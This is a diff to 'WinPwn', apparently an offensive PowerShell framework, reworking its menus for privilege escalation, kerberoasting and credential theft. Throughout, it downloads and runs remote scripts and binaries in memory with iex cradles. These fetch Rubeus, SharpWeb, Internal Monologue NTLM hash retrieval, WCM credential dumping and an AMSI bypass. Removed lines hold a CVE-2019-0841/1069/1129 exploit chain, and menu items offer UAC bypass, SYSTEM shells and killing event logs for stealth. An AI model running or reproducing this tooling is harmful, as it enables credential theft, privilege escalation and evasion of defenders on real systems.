@@ -96,12 +96,10 @@ function sharpcradle{
     #>
         Param
     (
-        [bool]
+        [switch]
         $allthosedotnet,
-	    [bool]
-        $polar,
-        [string]
-        $url,
+	    [switch]
+        $web,
         [string]
         $argument1,
         [string]
@@ -131,114 +129,29 @@ __        ___       ____
             Write-Host -ForegroundColor Green '3. Search for missing windows patches Using Watson! '
             Write-Host -ForegroundColor Green '4. Get all those Browser Credentials with Sharpweb! '
             Write-Host -ForegroundColor Green '5. Check common Privesc vectors using Sharpup! '
-            Write-Host -ForegroundColor Green '6. Load Safetykatz to RAM and gather credentials! '
-            Write-Host -ForegroundColor Green '7. Exploit Missing Windows Updates (CVE-2019-0841, CVE-2019-1069, CVE-2019-1129, CVE-2019-1130)! '
-            Write-Host -ForegroundColor Green '8. Exit. '
+            Write-Host -ForegroundColor Green '6. Internal Monologue Attack: Retrieving NTLM Hashes without Touching LSASS! '
+            Write-Host -ForegroundColor Green '7. Exit. '
             Write-Host "================ WinPwn ================"
             $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
-            iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Invoke-Sharpcradle/master/Invoke-Sharpcradle.ps1')
+            
 
             Switch ($masterquestion) 
             {
-                 1{Write-Host -ForegroundColor Yellow 'Executing Seatbelt. Output goes to .\LocalRecon\'; Invoke-Sharpcradle -uri https://github.com/S3cur3Th1sSh1t/Creds/raw/master/Ghostpack/Seatbelt.exe -argument1 all >> $currentPath\LocalRecon\SeatBeltOutput.txt}
-                2{Write-Host -ForegroundColor Yellow 'Doing Kerberoasting + ASRepRoasting. Output goes to .\Exploitation\'; Invoke-Sharpcradle -uri https://github.com/S3cur3Th1sSh1t/Creds/raw/master/Ghostpack/Rubeus.exe -argument1 asreproast -argument2 "/format:hashcat" >> $currentPath\Exploitation\ASreproasting.txt; Invoke-Sharpcradle -uri https://github.com/S3cur3Th1sSh1t/Creds/raw/master/Ghostpack/Rubeus.exe -argument1 kerberoast -argument2 "/format:hashcat" >> $currentPath\Exploitation\Kerberoasting_Rubeus.txt}
-                3{Write-Host -ForegroundColor Yellow 'Checking for vulns using Watson. Output goes to .\Vulnerabilities\'; Invoke-Sharpcradle -uri https://github.com/S3cur3Th1sSh1t/Creds/raw/master/Ghostpack/Watson.exe >> $currentPath\Vulnerabilities\Privilege_Escalation_Vulns.txt;  }
-                4{Write-Host -ForegroundColor Yellow 'Getting all theese Browser Creds using Sharpweb. Output goes to .\Exploitation\'; Invoke-Sharpcradle -uri https://github.com/S3cur3Th1sSh1t/Creds/raw/master/Ghostpack/SharpWeb.exe -argument1 all >> $currentPath\Exploitation\Browsercredentials.txt}
-                5{Write-Host -ForegroundColor Yellow 'Searching for Privesc vulns. Output goes to .\Vulnerabilities\'; if (isadmin){Invoke-Sharpcradle -uri https://github.com/S3cur3Th1sSh1t/Creds/raw/master/Ghostpack/SharpUp.exe -argument1 audit >> $currentPath\Vulnerabilities\Privilege_Escalation_Vulns_SharpUp.txt}else{Invoke-Sharpcradle -uri https://github.com/S3cur3Th1sSh1t/Creds/raw/master/Ghostpack/SharpUp.exe >> $currentPath\Vulnerabilities\Privilege_Escalation_Vulns_SharpUp.txt;} }
-                6{if (isadmin){Write-Host -ForegroundColor Yellow 'Safetykatz ftw. Output goes to .\Exploitation\'; Invoke-Sharpcradle -uri https://github.com/S3cur3Th1sSh1t/Creds/raw/master/Ghostpack/SafetyKatz.exe >> $currentPath\Exploitation\SafetyCreds.txt}}
-                7{Write-Host -ForegroundColor Yellow 'Checking for vulns using Watson. Output goes to .\Vulnerabilities\'; Invoke-Sharpcradle -uri https://github.com/S3cur3Th1sSh1t/Creds/raw/master/Ghostpack/Watson.exe >> $currentPath\Vulnerabilities\Privilege_Escalation_Vulns.txt; If((Get-Content .\Vulnerabilities\Privilege_Escalation_Vulns.txt) -match "CVE-2019-0841 : VULNERABLE"){testtemp;[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-Webrequest -Uri https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/nc.exe -Outfile C:\temp\nc.exe; Invoke-Sharpcradle -uri https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/privesc.exe -argument1 license.rtf; Start-Sleep -Seconds 3; cmd /c start powershell -Command {C:\temp\nc.exe 127.0.0.1 2000}}If((Get-Content .\Vulnerabilities\Privilege_Escalation_Vulns.txt) -match "CVE-2019-1069 : VULNERABLE"){sharpcradle -polar $true;return;}; If((Get-Content .\Vulnerabilities\Privilege_Escalation_Vulns.txt) -match "CVE-2019-1129 : VULNERABLE"){sharpcradle -polar $true;return;};}
+                 1{Write-Host -ForegroundColor Yellow 'Executing Seatbelt. Output goes to the console only';iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Seatbelt.ps1'); Invoke-Seatbelt -Command "all"; pause}
+                2{Write-Host -ForegroundColor Yellow 'Doing Kerberoasting + ASRepRoasting. Output goes to .\Exploitation\';iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1'); Invoke-Rubeus -Command "asreproast /format:hashcat" >> $currentPath\Exploitation\ASreproasting.txt; Invoke-Rubeus -Command "kerberoast /format:hashcat" >> $currentPath\Exploitation\Kerberoasting_Rubeus.txt}
+                3{Write-Host -ForegroundColor Yellow 'Checking for vulns using Watson. Output goes to .\Vulnerabilities\'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpWatson.ps1'); Invoke-watson >> $currentPath\Vulnerabilities\Privilege_Escalation_Vulns.txt;  }
+                4{Write-Host -ForegroundColor Yellow 'Getting all theese Browser Creds using Sharpweb. Output goes to .\Exploitation\'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Sharpweb.ps1');Invoke-Sharpweb -command "all" >> $currentPath\Exploitation\Browsercredentials.txt}
+                5{Write-Host -ForegroundColor Yellow 'Searching for Privesc vulns. Output goes to .\Vulnerabilities\';iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpUp.ps1');if (isadmin){Invoke-SharpUp -command "audit" >> $currentPath\Vulnerabilities\Privilege_Escalation_Vulns_SharpUp.txt}else{Invoke-SharpUp -command " " >> $currentPath\Vulnerabilities\Privilege_Escalation_Vulns_SharpUp.txt;} }
+                6{if (isadmin){Write-Host -ForegroundColor Yellow 'Running Internalmonologue. Output goes to .\Exploitation\'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Internalmonologue.ps1');Invoke-Internalmonologue -command "-Downgrade true -impersonate true -restore true" >> $currentPath\Exploitation\SafetyCreds.txt}else{Write-Host -Foregroundcolor Yellow "Run as admin.";pause}}
             }
         }
-        While ($masterquestion -ne 8)
+        While ($masterquestion -ne 7)
     	      
 	    
     }
-    if ($polar)
+    if ($web)
     {
-    	iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Invoke-Sharpcradle/master/Invoke-Sharpcradle.ps1')
-    	$polaraction = Read-Host -Prompt 'Do you have a valid username and password for CVE-2019-1069?'
-	    if ($polaraction -eq "yes" -or $polaraction -eq "y" -or $polaraction -eq "Yes" -or $polaraction -eq "Y")
-	    {
-		    $username = Read-Host -Prompt 'Please enter the username'
-		    $password = Read-Host -Prompt 'Please enter the password'
-		    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-		    Invoke-Webrequest -Uri https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/schedsvc.dll -Outfile $currentPath\schedsvc.dll
-		    Invoke-Webrequest -Uri https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/schtasks.exe -Outfile $currentPath\schtasks.exe
-		    Invoke-Webrequest -Uri https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/test.job -Outfile $currentPath\test.job
-		
-		    if ([Environment]::Is64BitProcess)
-		    {
-			    Invoke-Sharpcradle -uri https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/SharpPolarbear.exe -argument1 license.rtf $username $password
-			    Start-Sleep -Seconds 1.5
-			    Invoke-Sharpcradle -uri https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/SharpPolarbear.exe -argument1 license.rtf $username $password
-		    }
-		    else
-		    {
-			    Invoke-Sharpcradle -uri https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/SharpPolarbearx86.exe -argument1 license.rtf $username $password
-			    Start-Sleep -Seconds 1.5
-			    Invoke-Sharpcradle -uri https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/SharpPolarbearx86.exe -argument1 license.rtf $username $password
-		    }
-		
-		    move env:USERPROFILE\Appdata\Local\temp\license.rtf C:\windows\system32\license.rtf
-		    del .\schedsvc.dll
-		    del .\schtasks.exe
-		    del C:\windows\system32\tasks\test
-	    }
-        else
-        {
-            $system = Read-Host -Prompt 'You can also try to elevate privileges using the last sandboxescaper vuln (ByeBear). Lets do it? (y/n)'
-	        if ($system -eq "no" -or $system -eq "n" -or $system -eq "No" -or $system -eq "N")
-	            {
-	                Invoke-Sharpcradle -uri https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/SharpByeBear.exe -argument1 "license.rtf 2"
-		            Write-Host -ForegroundColor Yellow 'Click into the search bar on your lower left side'
-		            Start-Sleep -Seconds 15
-		            Write-Host 'Next Try..'
-		            Invoke-Sharpcradle -uri https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/SharpByeBear.exe -argument1 "license.rtf 2"
-		            Write-Host -ForegroundColor Yellow 'Click into the search bar on your lower left side'
-		            Start-Sleep -Seconds 15
-                }
-        }
-    }
-    else
-    {    
-        iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Invoke-Sharpcradle/master/Invoke-Sharpcradle.ps1')
-     	if ($url)
-        {
-            if ($argument1)
-            {
-                if ($argument2)
-                {
-                    if($argument3)
-                    {
-                        Invoke-Sharpcradle -uri $url -argument1 $argument1 -argument2 $argument2 -argument3 $argument3
-                    }
-                    else{Invoke-Sharpcradle -uri $url -argument1 $argument1 -argument2 $argument2}
-                }
-                else{Invoke-Sharpcradle -uri $url -argument1 $argument1}
-            }
-            else
-            {
-                $arg = Read-Host -Prompt 'Do you need to set custom parameters / arguments for the executable?'
-	            if ($arg -eq "yes" -or $arg -eq "y" -or $arg -eq "Yes" -or $arg -eq "Y")
-                {
-                    $argument1 = Read-Host -Prompt 'Enter argument1 for the executable file:'
-                    $arg1 = Read-Host -Prompt 'Do you need more arguments for the executable?'
-	                if ($arg1 -eq "yes" -or $arg1 -eq "y" -or $arg1 -eq "Yes" -or $arg1 -eq "Y")
-                    {
-                        $argument2 = Read-Host -Prompt 'Enter argument2 for the executable file:'
-                        Invoke-Sharpcradle -uri $url -argument1 $argument1 -argument2 $argument2
-                    }
-                    else{Invoke-Sharpcradle -uri $url -argument1 $argument1}
-                }
-                else
-                {
-                    Invoke-Sharpcradle -Uri $url
-                }
-            }
-         
-        }
-        else
-        {
+    	    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Invoke-Sharpcradle/master/Invoke-Sharpcradle.ps1')
             $url = Read-Host -Prompt 'Please Enter an URL to a downloadable C# Binary to run in memory, for example https://github.com/S3cur3Th1sSh1t/Creds/raw/master/pwned_x64/notepad.exe'
     	    $arg = Read-Host -Prompt 'Do you need to set custom parameters / arguments for the executable?'
 	        if ($arg -eq "yes" -or $arg -eq "y" -or $arg -eq "Yes" -or $arg -eq "Y")
@@ -253,11 +166,7 @@ __        ___       ____
                 else{Invoke-Sharpcradle -uri $url -argument1 $argument1}
              
             }
-            else
-            {
-                Invoke-Sharpcradle -Uri $url
-            }
-        }
+
             	
     }
 }
@@ -429,8 +338,7 @@ __        ___       ____
 	    Write-Host -ForegroundColor Green '10. Exit. '
             Write-Host "================ WinPwn ================"
             $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
-            iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Invoke-Sharpcradle/master/Invoke-Sharpcradle.ps1')
-
+            
             Switch ($masterquestion) 
             {
                 1{iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/DumpWCM.ps1');Write-Host "Dumping now, output goes to .\Exploitation\WCMCredentials.txt"; Invoke-WCMDump >> $currentPath\Exploitation\WCMCredentials.txt}
@@ -438,10 +346,10 @@ __        ___       ____
                 3{if(isadmin){safedump}}
                 4{if(isadmin){dumplsass}}
                 5{lazagnemodule}
-                6{Write-Host -ForegroundColor Yellow 'Getting all theese Browser Creds using Sharpweb. Output goes to .\Exploitation\'; Invoke-Sharpcradle -uri https://github.com/S3cur3Th1sSh1t/Creds/raw/master/Ghostpack/SharpWeb.exe -argument1 all >> $currentPath\Exploitation\Browsercredentials.txt}
-		7{kittenz}
-		8{if(isadmin){wificreds}}
-		9{if(isadmin){samfile}}
+                6{Write-Host -ForegroundColor Yellow 'Getting all theese Browser Creds using Sharpweb. Output goes to .\Exploitation\';iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Invoke-Sharpcradle/master/Invoke-Sharpcradle.ps1'); Invoke-Sharpweb -command "all" >> $currentPath\Exploitation\Browsercredentials.txt}
+		        7{kittenz}
+		        8{if(isadmin){wificreds}}
+		        9{if(isadmin){samfile}}
              }
         }
         While ($masterquestion -ne 10)
@@ -1431,8 +1339,8 @@ function GPOAudit
     #Domain Recon
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
     pathcheck
-    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Invoke-Sharpcradle/master/Invoke-Sharpcradle.ps1')
-    Invoke-Sharpcradle -uri https://github.com/S3cur3Th1sSh1t/Creds/blob/master/Ghostpack/Grouper2.exe?raw=true -argument1 "-f" -argument2 "$currentPath\DomainRecon\GPOAudit.html"
+    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Grouper2.ps1')
+    Invoke-Grouper2 -command "-f $currentPath\DomainRecon\GPOAudit.html"
 }
 
 
@@ -2103,13 +2011,13 @@ function kerberoasting
     #Exploitation Phase
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
     pathcheck
-    Write-Host -ForegroundColor Yellow 'Starting Exploitation Phase:'
     Write-Host -ForegroundColor Red 'Kerberoasting active:'
-    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Invoke-Sharpcradle/master/Invoke-Sharpcradle.ps1')    
+        
     Write-Host -ForegroundColor Yellow 'Doing Kerberoasting + ASRepRoasting using rubeus. Output goes to .\Exploitation\'
-	Invoke-Sharpcradle -uri https://github.com/S3cur3Th1sSh1t/Creds/raw/master/Ghostpack/Rubeus.exe -argument1 asreproast -argument2 "/format:hashcat" >> $currentPath\Exploitation\ASreproasting.txt
-	Invoke-Sharpcradle -uri https://github.com/S3cur3Th1sSh1t/Creds/raw/master/Ghostpack/Rubeus.exe -argument1 kerberoast -argument2 "/format:hashcat" >> $currentPath\Exploitation\Kerberoasting_Rubeus.txt
-    Write-Host -ForegroundColor Yellow 'Using the powershell version for sure'
+    iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1')
+    Invoke-Rubeus -Command "asreproast /format:hashcat" >> $currentPath\Exploitation\ASreproasting.txt
+    Invoke-Rubeus -Command "kerberoast /format:hashcat" >> $currentPath\Exploitation\Kerberoasting_Rubeus.txt
+	Write-Host -ForegroundColor Yellow 'Using the powershell version as backup: '
     cmd /c start powershell -Command {$currentPath = (Get-Item -Path ".\" -Verbose).FullName;$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/amsi.ps1');IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/Invoke-Kerberoast.ps1');Invoke-Kerberoast -OutputFormat Hashcat | fl >> $currentPath\Exploitation\Kerberoasting.txt;Write-Host -ForegroundColor Yellow ''Module finished, Hashes saved to .\Exploitation\Kerberoasting.txt:'' ;pause}
 }
 
@@ -2427,7 +2335,7 @@ __        ___       ____
         Write-Host -ForegroundColor Green '1. Execute Inveigh - ADIDNS/LLMNR/mDNS/NBNS spoofer! '
         Write-Host -ForegroundColor Green '2. Local recon menu! '
         Write-Host -ForegroundColor Green '3. Domain recon menu! '
-        Write-Host -ForegroundColor Green '4. Local privilege escalation checks! '
+        Write-Host -ForegroundColor Green '4. Local privilege escalation check menu! '
         Write-Host -ForegroundColor Green '5. Get SYSTEM using Windows Kernel Exploits! '
 	Write-Host -ForegroundColor Green '6. Bypass UAC! '
 	Write-Host -ForegroundColor Green '7. Get a SYSTEM Shell! '
@@ -2436,7 +2344,7 @@ __        ___       ____
         Write-Host -ForegroundColor Green '10. Create an ADIDNS Wildcard! '
         Write-Host -ForegroundColor Green '11. Sessiongopher! '
         Write-Host -ForegroundColor Green '12. Kill the event log services for stealth! '
-	Write-Host -ForegroundColor Green '13. Execute some C# Magic for Creds, Recon and Privesc!'
+	Write-Host -ForegroundColor Green '13. PowerSharpPack menu!'
 	Write-Host -ForegroundColor Green '14. Load custom C# Binaries from a webserver to Memory and execute them!'
 	Write-Host -ForegroundColor Green '15. DomainPasswordSpray Attacks!'
         Write-Host -ForegroundColor Green '16. Exit. '
@@ -2450,15 +2358,15 @@ __        ___       ____
              3{domainreconmodules}
              4{privescmodules}
              5{kernelexploits}
-	     6{UACBypass}
-	     7{SYSTEMShell}
+	         6{UACBypass}
+	         7{SYSTEMShell}
              8{kerberoasting}
              9{kittielocal}
              10{adidnswildcard}
              11{sessionGopher}
             12{inv-phantom}
-            13{sharpcradle -allthosedotnet $true}
-	    14{sharpcradle}
+            13{sharpcradle -allthosedotnet}
+	        14{sharpcradle -web}
             15{domainpassspray}
         
     }
